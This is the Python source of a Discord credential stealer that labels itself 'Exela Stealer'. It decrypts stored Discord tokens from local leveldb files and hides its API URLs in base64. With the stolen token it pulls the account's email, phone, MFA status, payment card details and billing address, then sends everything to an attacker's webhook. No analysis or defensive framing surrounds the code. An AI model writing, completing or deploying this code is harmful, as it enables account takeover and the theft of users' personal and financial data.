import re, os, requests, sys
import base64, encKey, dhooks, decryption, json

quicaa = encKey.getKey()
qickaa = decryption.quicka()
string = '-' * 82

if not os.path.isdir(os.getenv("appdata") + f"\\discord"):
    sys.exit()

class Discord:
    def __init__(self, webhook_url) -> None:
        self.nitro = None
        self.billings = []
        self.bilMethod = []
        self.lastfour = []
        self.month = []
        self.year = []
        self.cart_name = []
        self.addres = ""
        self.regexValue = r"dQw4w9WgXcQ:[^\"]*"
        self.okURL = self.decode('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvdjkvdXNlcnMvQG1l').decode()
        self.infoURL = self.decode('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvdjYvdXNlcnMvQG1lL2JpbGxpbmcvcGF5bWVudC1zb3VyY2Vz=').decode()
        self.token = ""
        self.URL = webhook_url
        self.webhook = dhooks.Webhook(self.URL, avatar_url="https://i.hizliresim.com/94iepii.jfif", username="quicaxd")
        self.embed = dhooks.Embed(title="***Developer's github account***", description="***Exela Stealer***", color=0xaea795, url="https://github.com/quicaxd")
        self.Run()
        self.get_dcinfo()
    def Run(self):
        paths = {
            "Discord" : os.getenv("appdata") +  "\\" + os.path.join("discord", "Local Storage", "leveldb"),
            "Discord Canary" : os.getenv("appdata") + "\\" + os.path.join("discordcanary", "Local Storage", "leveldb"),
            "Discord PTB" : os.getenv("appdata") + "\\" + os.path.join("discordptb", "Local Storage", "leveldb")
        }
        for name, path in paths.items():
            if not os.path.isdir(path):
                continue
            discord = name.replace(" ", "").lower()
            if "discord" in path:
                if not os.path.isfile(os.getenv("appdata") + f"\\{discord}\\Local State"):
                    continue
                for file_name in os.listdir(path):
                    if file_name[-3:] not in ["log", "ldb"]:
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                        for q in re.findall(self.regexValue, line):
                            if qickaa.mainFunc(self.decode(q.split('dQw4w9WgXcQ:')[1]), quicaa.getkey(os.getenv("appdata") + f"\\{discord}", "")) in self.token:
                                continue
                            else:
                                self.token = qickaa.mainFunc(self.decode(q.split('dQw4w9WgXcQ:')[1]), quicaa.getkey(os.getenv("appdata") + f"\\{discord}", ""))
    def get_dcinfo(self):
        headers = {
            "Authorization" : self.token
        }
        req = requests.get(self.okURL, headers=headers)
        req2 = requests.get(self.infoURL, headers=headers)
        
        if req.status_code == 200:
            username = req.json()["username"]
            email = req.json()["email"]
            id = req.json()["id"]
            phone = req.json()["phone"]
            bio = req.json()["bio"]
            mfa = req.json()["mfa_enabled"]
            paymentMethod = req.json()["premium_type"]
            avatar = req.json()["avatar"]
            discordPhoto = f"https://cdn.discordapp.com/avatars/{id}/{avatar}"
            if requests.get(discordPhoto + ".png").status_code == 200:
                discordPhoto += ".png"
            else:
                discordPhoto += ".gif"
            self.embed.set_thumbnail(url=discordPhoto)
            self.embed.add_field(name="<a:earthpink:996004236531859588> Discord Account ID\n", value=f"```{id}```")
            self.embed.add_field(name="<a:rainbowheart:996004226092245072> Discord Username\n", value=f"```{username}```\n")
            self.embed.add_field(name="<a:rainbowheart:996004226092245072> Discord Email\n",value=f"```{email}```")
            if phone != None:
                self.embed.add_field(name=f"<:starxglow:996004217699434496> Discord Phone\n", value=f'```{phone}```') 
            self.embed.add_field(name="<:mfa:1021604916537602088> MFA Enabled?\n", value=f"```{mfa}```")
            if bio != "":
                self.embed.add_field(name="<a:gift:1021608479808569435> Discord Account Biography", value=f"```{bio}```\n")
            if paymentMethod == 0:
                self.nitro = "No Nitro"
            elif paymentMethod == 1:
                self.nitro = "Nitro Classic"
            elif paymentMethod == 2:
                self.nitro = "Normal Nitro"
            elif paymentMethod == 3:
                self.nitro = "Nitro Basic"
            else:
                self.nitro = None
            self.embed.add_field(name="<a:pinklv:996004222090891366> Nitro Billing", value=f"```{self.nitro}```")
            if req2:
                parsed = json.loads(req2.text.replace("[", "").replace("]", ""))
                self.cart_name.append(parsed["billing_address"]["name"])
                self.addres =parsed["billing_address"]["line_1"] + ", " + parsed["billing_address"]["city"] +  ", " +parsed["billing_address"]["country"] + ", " + parsed["billing_address"]["postal_code"]
                for method in req2.json():
                    if method["type"] == 1:
                        self.billings.append("💳")
                    elif method["type"] == 2:
                        self.billings.append("<:paypal:973417655627288666>")
                    else:
                        self.billings.append("Unkown payment Method")
                for brand in req2.json():
                    self.bilMethod.append(brand["brand"])
                    self.lastfour.append(brand["last_4"])
                    self.month.append(brand["expires_month"])
                    self.year.append(brand["expires_year"])
                    
                for f in self.billings:
                    pass
                for x in self.bilMethod:
                    pass
                for q in self.lastfour:
                    pass
                for y in self.month:
                    pass
                for z in self.year:
                    pass
                for quica in self.cart_name:
                    pass
                self.embed.add_field(name="Payment Information", value=f"```{f} Card Type {x} Last Four {q} Expiration Date {y}/{z} Cart on name {quica} Adress {self.addres} ```")
            self.embed.add_field(name=f"\n<a:pinkcrown:996004209667346442> Discord Token\n", value=f"```{self.token}```")
            self.webhook.send(embed=self.embed)
        else:
            pass

    def decode(self, entry):
        return base64.b64decode(entry)
